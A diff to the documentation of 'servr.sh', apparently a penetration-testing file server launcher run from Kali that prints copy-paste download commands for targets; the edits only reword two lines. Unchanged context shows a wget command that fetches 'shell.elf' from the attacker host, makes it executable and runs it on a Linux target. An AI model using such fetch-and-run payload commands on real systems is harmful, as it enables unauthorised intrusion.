@@ -10,7 +10,7 @@ tags:
 # servr.sh
 
 ## What It Is
-Single-file, foreground file server launcher for OffSec engagement use. Given a mode (HTTP, SMB, or FTP), it starts the appropriate server, auto-detects Kali IP, prints a fully resolved copy-paste command box for both Linux and Windows targets, and lists the files available in the served directory.
+Single-file, foreground file server launcher for engagement use. Given a mode (HTTP, SMB, or FTP), it starts the appropriate server, auto-detects Kali IP, prints a fully resolved copy-paste command box for both Linux and Windows targets, and lists the files available in the served directory.
 
 Runs in the foreground. Ctrl+C stops the server cleanly.
 
@@ -227,7 +227,7 @@ cd ~/payloads && ./servr.sh http --port 8080
 wget http://KALI_IP:8080/shell.elf -O /tmp/shell && chmod +x /tmp/shell && /tmp/shell
 ```
 
-### Quick engagement-day tool drop (Linux target)
+### Quick engagement tool drop (Linux target)
 ```bash
 cd ~/tools
 ./servr.sh http --port 8080
